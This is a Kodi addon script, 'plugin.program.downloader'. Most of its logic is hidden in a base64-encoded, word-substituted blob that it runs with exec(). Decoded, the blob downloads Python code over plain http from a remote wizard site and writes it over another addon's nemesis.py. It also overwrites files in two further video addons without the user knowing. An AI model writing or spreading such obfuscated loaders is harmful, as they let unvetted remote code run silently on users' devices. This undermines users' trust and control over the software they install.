import xbmc,xbmcaddon,xbmcvfs,xbmcgui
import os, re, requests, sys
from contextlib import contextmanager

action = sys.argv[1]
addonbase = xbmcaddon.Addon('plugin.program.downloader')
addon_nemesis = xbmcaddon.Addon('plugin.video.nemesisaio')
addon_EntertainMe = xbmcaddon.Addon('plugin.video.EntertainMe')
addon_fmovies = xbmcaddon.Addon('plugin.video.fmoviesto')
fix_neme_ver = addonbase.getSetting('okpnneme')
if fix_neme_ver == '' or fix_neme_ver is None:
    fix_neme_ver = '0'
fix_enter_ver = addonbase.getSetting('okpnenter')
if fix_enter_ver == '' or fix_enter_ver is None:
    fix_enter_ver = '0'
fix_fmovies_ver = addonbase.getSetting('okpnfmovies')
if fix_fmovies_ver == '' or fix_fmovies_ver is None:
    fix_fmovies_ver = '0'
neme_ver = addon_nemesis.getAddonInfo('version')
enter_ver = addon_EntertainMe.getAddonInfo('version')
fmovies_ver = addon_fmovies.getAddonInfo('version')


@contextmanager
def busy_dialog():
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    try:
        yield
    finally:
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')

def openfile(path_to_the_file):
    try:
        fh = xbmcvfs.File(path_to_the_file)
        contents=fh.read()
        fh.close()
        return contents
    except:
        print("Wont open: %s" % path_to_the_file)
        return None

def savefile(path_to_the_file,content):
    try:
        fh = xbmcvfs.File(path_to_the_file, 'w')
        fh.write(content)  
        fh.close()
    except: print("Wont save: %s" % path_to_the_file)

exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f.decode('utf-8')))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MzIgMTUoKToKCTNhIDJiKCk6CgkJMWQgMjYgPCBlOgoJCQkzID0gYS5jCgkJCTUgPSA5LmIoMygnMTYnKSkKCQkJNjUgPSA0NS4xNi4yOCg1LCc0MS40YicpCgkJCTM0ID0gMygnNWInKQoJCQkxOSA9IGEuMTgoJzI3JykKCQkJMiA9IDEzKDY1KQoJCQkxZCAzMyBlIDMxIDI6CgkJCQk1ZToKCQkJCQkxID0gM2MuNWQoJzU4Oi8vMzUuNjEvNTMvNDkvNTAvNTUvNTknLCA0ND0xMCkuNDIKCQkJCQkxID0gMS40NygnNWMtOCcpCgkJCQkJMmMgPSA1Zi4zZignIyMoLis/KSMjJywgMSlbMF0KCQkJCQkxZCAzMyA0ZCgyYykgPCA0ZChlKToKCQkJCQkJM2QoNjUsMSkKCQkJCQkJNjAuMmUoNDgpCgkJCQkJCWEuNygnMjcnLCAnMjUnKQoJCQkJCQkxMS43KCcxNScsIGUpCgkJCQk0YyAyMzoKCQkJCQkzOAoKCTYwLjQoNjQpCgoKMzIgNjIoKToKCTFkIDI0IDwgMTI6CgkJMyA9IDYuYwoJCTUgPSA5LmIoMygnMTYnKSkKCQk2NSA9IDQ1LjE2LjI4KDUsJzFhJywgJzU2JywgJzJhLjRiJykKCQkyMCA9ICc0MzovLzU3LzQ2LzE0LjQwLjJmLzFhLzRmJwoJCTE5ID0gNi4xOCgnMjcnKQoJCTIgPSAxMyg2NSkKCQkxZCAzMyAxMiAzMSAyOgoJCQk5LjUyKDIwLCA2NSkKCQkJNjAuMmUoNDgpCgkJCTYuNygnMjcnLCAnMjUnKQoJCQkxMS43KCc2MicsIDEyKQoKCTYwLjQoNjQpCgozMiBkKCk6CgkxZCAxZiA8IDE3OgoJCTMgPSAyMi5jCgkJNSA9IDkuYigzKCcxNicpKQoJCTY1ID0gNDUuMTYuMjgoNSwnNTQuNGInKQoJCTIgPSAxMyg2NSkKCQkxID0gMi4zZSgnNWEoMWIpJywgJzkuM2IoMWIpJykKCQkzYSA5LjNiKDY1LCAnNjYnKSA2MyBmOgoJCQlmLjRlKDEpCgkJMTEuNygnZCcsIDE3KQoKCTYwLjQoNjQpCgoxZCA2MC4xYygnNGEuMjEoMmQuNTEpJyk6CgkxZCAnMTQuMWUuMzAnIDMxIDY0OgoJCTE1KCkKCTM3ICcxNC4xZS4yOScgMzEgNjQ6CgkJNjIoKQoJMzcgJzE0LjFlLjM2JyAzMSA2NDoKCQlkKCkKCTM5OgoJCTYwLjQoNjQpCjM5OgoJMzg=")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|newcontent|basecontent|addonInfo|executebuiltin|addonPath|addon_EntertainMe|setSetting|8|xbmcvfs|addon_nemesis|translatePath|getAddonInfo|okpnfmovies|neme_ver|f|10|addonbase|enter_ver|openfile|plugin|okpnneme|path|fmovies_ver|getSetting|pinstatus|resources|jfilename|getCondVisibility|if|video|fix_fmovies_ver|fixpath|AddonIsEnabled|addon_fmovies|BaseException|fix_enter_ver|Passed|fix_neme_ver|pin|join|EntertainMe|updatecheck|busy_dialog|match|repository|sleep|downloader|nemesisaio|in|def|not|addonname|gknwizard|fmoviesto|elif|pass|else|with|File|requests|savefile|replace|findall|program|nemesis|content|special|timeout|os|addons|decode|300|Builds|System|py|except|str|write|fixen|GKoBu|gkobu|copy|repo|main|xmls|libs|home|http|okpn|open|name|utf|get|try|re|xbmc|eu|okpnenter|as|action|basepypath|w".split("|")))